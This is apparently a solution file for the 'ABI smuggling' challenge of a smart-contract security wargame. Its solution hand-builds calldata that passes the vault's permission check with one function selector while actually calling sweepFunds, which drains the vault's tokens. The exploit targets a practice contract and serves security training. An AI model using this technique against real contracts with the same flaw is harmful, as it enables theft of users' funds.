const { ethers } = require("hardhat");
const { expect } = require("chai");

describe("[Challenge] ABI smuggling", function () {
  let deployer, player, recovery;
  let token, vault;

  const VAULT_TOKEN_BALANCE = 1000000n * 10n ** 18n;

  before(async function () {
    /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
    [deployer, player, recovery] = await ethers.getSigners();

    // Deploy Damn Valuable Token contract
    token = await (
      await ethers.getContractFactory("DamnValuableToken", deployer)
    ).deploy();

    // Deploy Vault
    vault = await (
      await ethers.getContractFactory("SelfAuthorizedVault", deployer)
    ).deploy();
    expect(await vault.getLastWithdrawalTimestamp()).to.not.eq(0);

    // Set permissions
    const deployerPermission = await vault.getActionId(
      "0x85fb709d",
      deployer.address,
      vault.address
    );
    const playerPermission = await vault.getActionId(
      "0xd9caed12",
      player.address,
      vault.address
    );
    await vault.setPermissions([deployerPermission, playerPermission]);
    expect(await vault.permissions(deployerPermission)).to.be.true;
    expect(await vault.permissions(playerPermission)).to.be.true;

    // Make sure Vault is initialized
    expect(await vault.initialized()).to.be.true;

    // Deposit tokens into the vault
    await token.transfer(vault.address, VAULT_TOKEN_BALANCE);

    expect(await token.balanceOf(vault.address)).to.eq(VAULT_TOKEN_BALANCE);
    expect(await token.balanceOf(player.address)).to.eq(0);

    // Cannot call Vault directly
    await expect(
      vault.sweepFunds(deployer.address, token.address)
    ).to.be.revertedWithCustomError(vault, "CallerNotAllowed");
    await expect(
      vault.connect(player).withdraw(token.address, player.address, 10n ** 18n)
    ).to.be.revertedWithCustomError(vault, "CallerNotAllowed");
  });

  it("Execution", async function () {
    /** CODE YOUR SOLUTION HERE */
    const signature = ethers.utils
      .keccak256(ethers.utils.toUtf8Bytes("execute(address,bytes)"))
      .substring(0, 10);

    const data =
      signature +
      vault.address.slice(2).padStart(64, "0") +
      "0000000000000000000000000000000000000000000000000000000000000080" + // calldata offset
      "0000000000000000000000000000000000000000000000000000000000000000" + // empty bytes
      "d9caed1200000000000000000000000000000000000000000000000000000000" + // function selector used to pass the check
      "0000000000000000000000000000000000000000000000000000000000000044" + // calldata length
      "85fb709d" + // function selector of the sweepFunds function
      recovery.address.slice(2).padStart(64, "0") +
      token.address.slice(2).padStart(64, "0");

    await player.sendTransaction({
      from: player.address,
      to: vault.address,
      data: data,
      gasLimit: 10000000,
    });
  });

  after(async function () {
    /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */
    expect(await token.balanceOf(vault.address)).to.eq(0);
    expect(await token.balanceOf(player.address)).to.eq(0);
    expect(await token.balanceOf(recovery.address)).to.eq(VAULT_TOKEN_BALANCE);
  });
});
